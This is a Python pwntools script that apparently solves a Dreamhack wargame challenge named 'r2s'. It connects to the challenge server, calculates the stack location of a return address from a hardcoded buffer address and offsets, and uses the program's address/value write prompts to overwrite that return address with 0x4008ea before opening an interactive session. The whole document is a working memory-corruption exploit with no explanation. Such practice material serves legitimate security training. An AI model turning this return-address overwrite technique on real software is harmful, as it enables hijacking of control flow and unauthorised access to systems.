from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host1.dreamhack.games", 19055)
# p = process("./r2s")
context.arch = "amd64"

# [1] Get information about buf
buf = int("0x7fffffffdf80", 16)
buf += 0x40
buf += 0x8*3
slog("Address of RET", buf)

p.send(b"A")

p.recvuntil(b"Addr : ")
p.send(str(buf))
slog("Input Addr", buf)

code = int("0x4008ea", 16)

p.recvuntil(b"Value : ")
p.send(str(code))
slog("Input value", code)

p.interactive()